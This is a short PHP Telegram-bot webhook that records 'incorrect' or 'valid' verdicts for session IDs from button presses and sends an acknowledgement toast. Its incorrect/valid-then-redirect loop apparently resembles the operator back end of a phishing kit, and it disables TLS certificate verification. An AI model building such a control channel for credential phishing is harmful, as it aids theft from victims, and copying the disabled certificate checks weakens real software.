<?php
require_once 'config.php';

$content = file_get_contents("php://input");
$update = json_decode($content, true);

if (isset($update['callback_query'])) {
    $callback = $update['callback_query'];
    $data = $callback['data']; // e.g., "incorrect_ID" or "valid_ID"
    $callbackQueryId = $callback['id'];

    $parts = explode('_', $data);
    $action = $parts[0] ?? '';
    $sid = $parts[1] ?? '';

    if ($sid) {
        $sessions = file_exists(SESSIONS_FILE) ? json_decode(file_get_contents(SESSIONS_FILE), true) : [];
        
        if ($action === 'incorrect') {
            $sessions[$sid] = 'incorrect';
            $answerText = "❌ Action Recorded: Marked as Incorrect!";
        } elseif ($action === 'valid') {
            $sessions[$sid] = 'valid';
            $answerText = "✅ Action Recorded: Marked as Valid / Redirecting...";
        }

        file_put_contents(SESSIONS_FILE, json_encode($sessions));

        // ONLY send an acknowledgment popup (toast) to Telegram. 
        // We completely removed editMessageText so the buttons stay visible and functional!
        $apiUrl = "https://api.telegram.org/bot" . BOT_TOKEN . "/answerCallbackQuery?callback_query_id=" . urlencode($callbackQueryId) . "&text=" . urlencode($answerText) . "&show_alert=false";

        $ch = curl_init($apiUrl);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
        curl_exec($ch);
        curl_close($ch);
    }
}
?>